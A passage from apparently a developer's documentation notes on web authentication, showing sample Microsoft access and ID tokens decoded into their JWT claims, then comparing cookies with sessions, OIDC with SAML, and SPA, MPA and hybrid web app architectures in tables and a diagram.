    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imk2bEdrM0ZaenhSY1ViMkMzbkVRN3N5SEpsWSJ9.eyJhdWQiOiI2ZTc0MTcyYi1iZTU2LTQ4NDMtOWZmNC1lNjZhMzliYjEyZTMiLCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vNzJmOTg4YmYtODZmMS00MWFmLTkxYWItMmQ3Y2QwMTFkYjQ3L3YyLjAiLCJpYXQiOjE1MzcyMzEwNDgsIm5iZiI6MTUzNzIzMTA0OCwiZXhwIjoxNTM3MjM0OTQ4LCJhaW8iOiJBWFFBaS84SUFBQUF0QWFaTG8zQ2hNaWY2S09udHRSQjdlQnE0L0RjY1F6amNKR3hQWXkvQzNqRGFOR3hYZDZ3TklJVkdSZ2hOUm53SjFsT2NBbk5aY2p2a295ckZ4Q3R0djMzMTQwUmlvT0ZKNGJDQ0dWdW9DYWcxdU9UVDIyMjIyZ0h3TFBZUS91Zjc5UVgrMEtJaWpkcm1wNjlSY3R6bVE9PSIsImF6cCI6IjZlNzQxNzJiLWJlNTYtNDg0My05ZmY0LWU2NmEzOWJiMTJlMyIsImF6cGFjciI6IjAiLCJuYW1lIjoiQWJlIExpbmNvbG4iLCJvaWQiOiI2OTAyMjJiZS1mZjFhLTRkNTYtYWJkMS03ZTRmN2QzOGU0NzQiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJhYmVsaUBtaWNyb3NvZnQuY29tIiwicmgiOiJJIiwic2NwIjoiYWNjZXNzX2FzX3VzZXIiLCJzdWIiOiJIS1pwZmFIeVdhZGVPb3VZbGl0anJJLUtmZlRtMjIyWDVyclYzeERxZktRIiwidGlkIjoiNzJmOTg4YmYtODZmMS00MWFmLTkxYWItMmQ3Y2QwMTFkYjQ3IiwidXRpIjoiZnFpQnFYTFBqMGVRYTgyUy1JWUZBQSIsInZlciI6IjIuMCJ9.pj4N-w_3Us9DrBLfpCt
    ```

    ```json
    {
        "typ": "JWT",
        "alg": "RS256",
        "kid": "i6lGk3FZzxRcUb2C3nEQ7syHJlY"
    }.{
        "aud": "6e74172b-be56-4843-9ff4-e66a39bb12e3",
        "iss": "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/v2.0",
        "iat": 1537231048,
        "nbf": 1537231048,
        "exp": 1537234948,
        "aio": "AXQAi/8IAAAAtAaZLo3ChMif6KOnttRB7eBq4/DccQzjcJGxPYy/C3jDaNGxXd6wNIIVGRghNRnwJ1lOcAnNZcjvkoyrFxCttv33140RioOFJ4bCCGVuoCag1uOTT22222gHwLPYQ/uf79QX+0KIijdrmp69RctzmQ==",
        "azp": "6e74172b-be56-4843-9ff4-e66a39bb12e3",
        "azpacr": "0",
        "name": "Abe Lincoln",
        "oid": "690222be-ff1a-4d56-abd1-7e4f7d38e474",
        "preferred_username": "abeli@microsoft.com",
        "rh": "I",
        "scp": "access_as_user",
        "sub": "HKZpfaHyWadeOouYlitjrI-KffTm222X5rrV3xDqfKQ",
        "tid": "72f988bf-86f1-41af-91ab-2d7cd011db47",
        "uti": "fqiBqXLPj0eQa82S-IYFAA",
        "ver": "2.0"
    }.[Signature]
    ```

??? note "`id_token` example"
    ```text
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFMVE16YWtpaGlSbGFfOHoyQkVKVlhlV01xbyJ9.eyJ2ZXIiOiIyLjAiLCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vOTEyMjA0MGQtNmM2Ny00YzViLWIxMTItMzZhMzA0YjY2ZGFkL3YyLjAiLCJzdWIiOiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFJa3pxRlZyU2FTYUZIeTc4MmJidGFRIiwiYXVkIjoiNmNiMDQwMTgtYTNmNS00NmE3LWI5OTUtOTQwYzc4ZjVhZWYzIiwiZXhwIjoxNTM2MzYxNDExLCJpYXQiOjE1MzYyNzQ3MTEsIm5iZiI6MTUzNjI3NDcxMSwibmFtZSI6IkFiZSBMaW5jb2xuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiQWJlTGlAbWljcm9zb2Z0LmNvbSIsIm9pZCI6IjAwMDAwMDAwLTAwMDAtMDAwMC02NmYzLTMzMzJlY2E3ZWE4MSIsInRpZCI6IjkxMjIwNDBkLTZjNjctNGM1Yi1iMTEyLTM2YTMwNGI2NmRhZCIsIm5vbmNlIjoiMTIzNTIzIiwiYWlvIjoiRGYyVVZYTDFpeCFsTUNXTVNPSkJjRmF0emNHZnZGR2hqS3Y4cTVnMHg3MzJkUjVNQjVCaXN2R1FPN1lXQnlqZDhpUURMcSFlR2JJRGFreXA1bW5PcmNkcUhlWVNubHRlcFFtUnA2QUlaOGpZIn0.1AFWW-Ck5nROwSlltm7GzZvDwUkqvhSQpm55TQsmVo9Y59cLhRXpvB8n-55HCr9Z6G_31_UbeUkoz612I2j_Sm9FFShSDDjoaLQr54CreGIJvjtmS3EkK9a7SJBbcpL1MpUtlfygow39tFjY7EVNW9plWUvRrTgVk7lYLprvfzw-CIqw3gHC-T7IK_m_xkr08INERBtaecwhTeN4chPC4W3jdmw_lIxzC48YoQ0dB1L9-ImX98Egypfrlbm0IBL5spFzL6JDZIRRJOu8vecJvj1mq-IUhGt0MacxX8jdxYLP-KUu2d9MbNKpCKJuZ7p8gwTL5B7NlUdh_dmSviPWrw
    ```

    ```json
    {
        "typ": "JWT",
        "alg": "RS256",
        "kid": "1LTMzakihiRla_8z2BEJVXeWMqo"
    }.{
        "ver": "2.0",
        "iss": "https://login.microsoftonline.com/9122040d-6c67-4c5b-b112-36a304b66dad/v2.0",
        "sub": "AAAAAAAAAAAAAAAAAAAAAIkzqFVrSaSaFHy782bbtaQ",
        "aud": "6cb04018-a3f5-46a7-b995-940c78f5aef3",
        "exp": 1536361411,
        "iat": 1536274711,
        "nbf": 1536274711,
        "name": "Abe Lincoln",
        "preferred_username": "AbeLi@microsoft.com",
        "oid": "00000000-0000-0000-66f3-3332eca7ea81",
        "tid": "9122040d-6c67-4c5b-b112-36a304b66dad",
        "nonce": "123523",
        "aio": "Df2UVXL1ix!lMCWMSOJBcFatzcGfvFGhjKv8q5g0x732dR5MB5BisvGQO7YWByjd8iQDLq!eGbIDakyp5mnOrcdqHeYSnltepQmRp6AIZ8jY"
    }.[Signature]
    ```

### Cookie vs Session vs Session Cookie

| Term | What It Means | Where It Lives | Example |
|------|---------------|----------------|---------|
| **Cookie** | Generic HTTP cookie (any type) | Browser cookies | Any cookie (session ID, tracking, prefs, etc.) |
| **Session** | Server-side session data (user info, auth state) | Backend (Redis, DB, memory) | `{ userId: 123, role: 'admin', loginTime: ... }` |
| **Session ID** | Unique identifier that references the session | Session cookie (browser) → looked up on backend | `abc123` or `sess:f7e2a1b9c3d4` |
| **Persistent cookie** | Cookie with explicit expiration date (survives browser restart) | Browser cookies | `Set-Cookie: token=xyz; Max-Age=86400; HttpOnly` |
| **Session cookie** | Cookie that holds the session ID | Browser cookies | `Set-Cookie: session_id=abc123; HttpOnly` |
| 💡**Session ID cookie (neutral term)** | Cookie storing session ID (any persistence type) | Browser cookies | Could be session or persistent type |

!!! warning "Session cookie in SSO/BFF is often actually a persistent cookie"
    In the context of SSO or BFF, the term **Session Cookie** usually:

      - ✅**means**: a cookie used for session management (persistent or non-persistent).
      - ❌**Not**: a non-persistent cookie that expires at the end of the browser session (on close).

    A more accurate name would be **Session ID Cookie**. Depending on the IdP or BFF implementation, this cookie may be:

      - a **non-persistent session cookie** (no `Expires` / `Max-Age`), or
      - a **persistent cookie** (with `Expires` / `Max-Age`), e.g. for "remember me" / long-lived SSO.

### OIDC vs SAML

- **SAML** (Security Assertion Markup Language) is an older standard in [**XML** for single sign-on (SSO)](https://fusionauth.io/articles/authentication/how-sso-works#how-saml-sso-works) and identity federation, primarily used in enterprise environments, and **only for web-based applications**.

- **OIDC** is a more modern protocol in **JSON/REST** that is easier to implement and is designed for **web and mobile applications**, could be used for [SSO](#sso-and-oidc) too.

### SPA (Single Page Application) vs MPA (Multi-page application) vs Web App vs Browser

```mermaid
graph TD
    Browser["Browser<br/>(Chrome, Firefox, Safari, Edge)"]

    WebApp["Web App<br/>(Any app accessed via a browser)"]

    subgraph Types_of_Web_Apps["Types of Web Apps"]
        MPA["MPA<br/>(Multi-page Application / Traditional Web App)<br/><br/>(e.g. Django, Flask+Jinja<br/>Rails, Laravel<br/>Express+Templates)"]
        Hybrid["Hybrid / Modern Frameworks<br/><br/>(e.g. Next.js (React), Nuxt.js (Vue), SvelteKit (Svelte), Remix (React))"]
        SPA["SPA<br/>(Single Page Application)<br/><br/>(e.g. React, Vue, Angular, Svelte)"]
    end

    subgraph Rendering_Models["Rendering Location"]
        SSR["Server-side Web App (SSR)<br/>(HTML rendered on server)"]
        CSR["Client-side Web App (CSR)<br/>(HTML/UI rendered in browser via JS)"]
    end

    %% Relationships: Browser <-> Web App
    Browser -->|"loads & runs"| WebApp

    %% Web App types
    WebApp --> MPA
    WebApp --> Hybrid
    WebApp --> SPA

    %% Rendering models
    MPA -->|"typically"| SSR
    SPA -->|"typically"| CSR

    Hybrid -.->|"1️⃣initial load"| SSR
    Hybrid -.->|"2️⃣after hydration"| CSR

    style Browser fill:#e1f5ff
    style WebApp fill:#fff4e1
    style MPA fill:#f0f0f0
    style SPA fill:#f0f0f0
    style Hybrid fill:#e8f5e9
```

**Core Terms (Architecture & Client):**

- **Web App (SPA + MPA)**: A broader term that encompasses any application accessed via a web browser, including SPAs, multi-page applications (MPAs), and server-rendered applications. Web apps can vary in complexity and architecture.
- **Browser**: The software application (e.g., Chrome, Firefox, Safari) that users utilize to access web apps (SPA or MPA). The browser handles rendering HTML, executing JavaScript, managing cookies, and facilitating communication between the client and server.

**Rendering Location:**

- **Server-side Web App (SSR)**: The application's UI is generated and assembled into full HTML on the server before being sent to the browser. **Traditional Web Apps (MPAs)** are typically Server-side Web Apps.
- **Client-side Web App (CSR)**: The server sends minimal HTML and JavaScript, and the UI is **dynamically generated in the browser** using that JavaScript. **SPAs** are typically Client-side Web Apps.

| Feature                     | Traditional Web App (MPA)                                   | Single Page Application (SPA)                                            | Modern Hybrid (Next.js, Nuxt.js, Remix, SvelteKit...)                                                                 |
|----------------------------|--------------------------------------------------------------|---------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------|
| Primary Rendering          | Server-Side Rendering (SSR)                                 | Client-Side Rendering (CSR)                                              | ✅SSR/SSG for initial request,<br/>then CSR after hydration (often with React/Vue/Svelte Server Components where applicable) |
| Data Flow                  | Full HTML page <- Server                                     | HTML shell + JS bundle <- Server; data (JSON) via API                    | HTML + data pre-rendered on server (SSR/SSG) <- Server<br/>then JSON/API or loader-based data for client-side navigation |
| Page Loads                 | Full page reload on every navigation                        | ✅No full page reload; DOM updated dynamically                           | First load: full HTML from server; ✅subsequent navigations use client-side routing (SPA-like, no full reload)         |
| SEO                        | ✅Very good (content rendered on server, already available for crawlers) | Harder by default; better with SSR, SSG, pre-rendering, or hydration     | ✅Excellent when using SSR/SSG: crawlers see full HTML; good Core Web Vitals with caching/CDN/edge rendering           |
| Initial Load               | ✅Often fast (server sends ready-to-render HTML)             | Often slower (must download + parse + execute JS bundle before rendering)| ✅Fast and SEO-friendly: pre-rendered HTML + critical data; JS hydrates progressively in the background               |
| Post-Load UX               | Slower (each action may trigger a full reload)<br/>could be improved with caching/CDN | ✅Very fast / app-like (client-side routing and state)                   | ✅SPA-like UX after hydration: fast client-side transitions + server/data caching strategies                           |
| Typical Stacks             | Django, Flask + Jinja (Python), Laravel (PHP), Ruby on Rails, Express (Node.js) with templates, ASP.NET | Frontend (JS): React, Vue, Angular, Svelte, etc. consuming APIs (any languages) | Next.js (React), Nuxt.js (Vue), Remix (React), SvelteKit (Svelte), Astro (multi-framework), Qwik City, etc.           |
